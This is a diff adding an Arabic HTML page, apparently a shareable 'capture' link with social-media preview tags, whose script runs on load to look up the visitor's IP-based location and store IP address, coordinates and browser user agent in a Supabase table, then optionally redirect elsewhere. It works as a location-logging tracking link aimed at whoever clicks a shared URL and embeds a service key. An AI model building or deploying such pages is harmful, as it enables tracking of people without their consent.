@@ -1,0 +1,108 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <title>مشاركة موقعي</title>
+
+  <!-- Open Graph لظهور معاينة عند المشاركة -->
+  <meta property="og:title" content="شارك موقعك الآن 📍" />
+  <meta property="og:description" content="اضغط على الرابط وسيتم تحديد موقعك تلقائيًا (تقريبي عبر عنوان IP)." />
+  <meta property="og:image" content="https://img.youm7.com/large/201704190111181118.jpg" />
+  <meta property="og:url" content="https://xb7rbx.github.io/X/capture.html" />
+  <meta property="og:type" content="website" />
+  <!-- Twitter Card -->
+  <meta name="twitter:card" content="summary_large_image" />
+  <meta name="twitter:title" content="شارك موقعك الآن 📍" />
+  <meta name="twitter:description" content="تحديد موقع تقريبي عبر عنوان الـ IP." />
+  <meta name="twitter:image" content="https://img.youm7.com/large/201704190111181118.jpg" />
+
+  <style>
+    body{font-family:system-ui,-apple-system,Segoe UI;min-height:100svh;display:grid;place-items:center;padding:24px;line-height:1.7;background:#fafafa}
+    .card{max-width:560px;width:100%;border:1px solid #e5e7eb;border-radius:14px;padding:22px;background:#fff;box-shadow:0 6px 20px rgba(0,0,0,.06)}
+    .muted{color:#6b7280}
+    .ok{color:#047857;font-weight:700}
+    .err{color:#b91c1c;font-weight:700}
+    progress{width:100%}
+    .hidden{display:none}
+  </style>
+</head>
+<body>
+  <div class="card">
+    <h1>📍 يتم الآن تحديد موقعك (تقريبي)…</h1>
+    <p class="muted">لا حاجة لإذن؛ نستخدم تحديد الموقع عبر عنوان الـ IP.</p>
+    <progress id="bar" max="100" value="25"></progress>
+    <p id="status" class="muted">جارِ الطلب…</p>
+    <button id="retry" class="hidden">إعادة المحاولة</button>
+  </div>
+
+  <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
+  <script>
+    // مفاتيح مشروعك في Supabase
+    const PROJECT_URL = 'https://weaiftikalbujuecfuhf.supabase.co';
+    const ANON_KEY    = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6IndlYWlmdGlrYWxidWp1ZWNmdWhmIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NTYzOTU2MzAsImV4cCI6MjA3MTk3MTYzMH0.kxiytsgnkEOim_zUD49zgVp7rxr3nHAVHFb0Jq9dijk';
+    const TABLE       = 'pings';
+
+    const supabase = window.supabase.createClient(PROJECT_URL, ANON_KEY);
+
+    const bar = document.getElementById('bar');
+    const statusEl = document.getElementById('status');
+    const retryBtn = document.getElementById('retry');
+
+    const qs = new URLSearchParams(location.search);
+    const note = qs.get('note') || null;
+    const redirect = qs.get('redirect') || null;
+
+    function setStatus(t, c){ statusEl.textContent=t; statusEl.className=c||'muted'; }
+
+    // IP geolocation عبر ipwho.is (مجاني ولا يحتاج توكن)
+    async function ipGeo(){
+      const r = await fetch('https://ipwho.is/', { cache:'no-store' });
+      if (!r.ok) throw new Error('Load failed');
+      const j = await r.json();
+      if (!j.success) throw new Error('IP geolocation failed');
+      return {
+        lat: j.latitude ?? null,
+        lng: j.longitude ?? null,
+        ip: j.ip ?? null,
+        accuracy: 5000 // ~5 كم تقديري
+      };
+    }
+
+    async function save(row){
+      const { error } = await supabase.from(TABLE).insert([row]);
+      if (error) throw error;
+    }
+
+    async function start(){
+      try{
+        setStatus('جارِ الحصول على موقع تقريبي عبر IP…');
+        bar.value = 60;
+
+        const ua = navigator.userAgent;
+        const info = await ipGeo();
+
+        await save({
+          lat: info.lat, lng: info.lng, accuracy: info.accuracy,
+          ip: info.ip, ua, note, device_info: ua
+        });
+
+        bar.value = 100;
+        setStatus('تم حفظ موقع تقريبي عبر IP ✅','ok');
+        if (redirect) setTimeout(()=>location.href=redirect, 800);
+      }catch(e){
+        setStatus('خطأ: ' + e.message, 'err');
+        retryBtn.classList.remove('hidden');
+      }
+    }
+
+    retryBtn.addEventListener('click', ()=>{
+      retryBtn.classList.add('hidden');
+      setStatus('إعادة المحاولة…');
+      start();
+    });
+
+    start(); // يبدأ تلقائيًا
+  </script>
+</body>
+</html>
